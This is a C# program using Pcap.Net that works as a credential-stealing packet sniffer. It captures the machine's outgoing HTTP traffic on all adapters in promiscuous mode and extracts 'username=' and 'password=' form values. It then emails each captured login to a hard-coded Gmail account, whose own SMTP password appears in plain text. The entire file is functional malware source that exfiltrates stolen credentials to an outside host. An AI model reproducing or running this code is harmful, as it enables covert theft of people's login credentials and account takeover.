using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System.Net;
using System.IO;
using System.Net.Mail;
using System.Threading;

namespace ConsoleApplication28
{
    class Program
    {
        //finds computer ip adress
        public static string LocalIPAddress()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        private static int deviceNumber; //global integer to pass on between threads
        private static IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine; // global list of all deivices

        //capture thread
        public static void CaptureStarter()
        {           
            // Take the selected adapter
            PacketDevice selectedDevice = allDevices[deviceNumber];

            // Open the device
            using (PacketCommunicator communicator =
                selectedDevice.Open(65536,                                  // portion of the packet to capture
                // 65536 guarantees that the whole packet will be captured on all the link layers
                                    PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                    1000))                                  // read timeout
            {
                using (BerkeleyPacketFilter filter = communicator.CreateFilter("src " + LocalIPAddress() + " and tcp port 80"))
                {
                    // Set the filter
                    communicator.SetFilter(filter);
                }

                Console.WriteLine("Listening on device " + (deviceNumber + 1) + " out of " + allDevices.Count + " :  " + selectedDevice.Description + "...");

                // start the capture
                communicator.ReceivePackets(0, PacketHandler);
            }
        }

        static void Main(string[] args)
        {           
            //opens thread for every device, to capture traffic from all devices.
            Thread[] recievers = new Thread[allDevices.Count];
            for (int i = 0; i < allDevices.Count; i++)
            {
                deviceNumber = i;                               // sets global integer to device number to pass it on to the right thread
                recievers[i] = new Thread(CaptureStarter);      //creates thread
                recievers[i].Start();                           // starts thread
                Thread.Sleep(40);                               //thread sleeps for a while to let the just opened thread to finish it's initialisation
            }
        }

        // Callback function invoked by Pcap.Net for every incoming packet
        private static void PacketHandler(Packet packet)
        {
            //Console.WriteLine(packet.Timestamp.ToString("yyyy-MM-dd hh:mm:ss.fff") + " length:" + packet.Length);
            IpV4Datagram ip = packet.Ethernet.IpV4;
            UdpDatagram udp = ip.Udp;
            TcpDatagram tcp = ip.Tcp;
            string content = "";
            // pull the payload 
            if (tcp.IsValid && tcp.PayloadLength > 0)
            {
                Datagram dg = tcp.Payload;
                MemoryStream ms = dg.ToMemoryStream();
                StreamReader sr = new StreamReader(ms);
                content = sr.ReadToEnd();
            }

            // print ip addresses and udp ports
            string s = content;
            if (s.IndexOf("username=") != -1 && s.IndexOf("password=") != -1) // if program finds username and password in the sniffed data
            {
                //extracts username and password into string variables
                int userLength = s.IndexOf("&pass") - s.IndexOf("username=");
                string username = s.Substring(s.IndexOf("username="), userLength);
                Console.WriteLine(username);
                int passLength = s.IndexOf("&sub") - s.IndexOf("password=");
                string pass = s.Substring(s.IndexOf("password="), passLength);
                Console.WriteLine(pass);

                //data for email
                string smtp = "smtp.gmail.com";
                string emailaddr = "cybersniffsniff@gmail.com";
                string emailuser = "cybersniffsniff";
                string emailpassword = "cybergal123";

                //creates email object and configures smtp client
                MailMessage mail = new MailMessage(emailaddr, emailaddr, "Login From:" + LocalIPAddress() , username + "\n" + pass);
                SmtpClient client = new SmtpClient(smtp);
                client.Port = 587;
                client.Credentials = new System.Net.NetworkCredential(emailuser, emailpassword);
                client.EnableSsl = true;

                //sends email
                client.Send(mail);             
            }
        }
    }
}
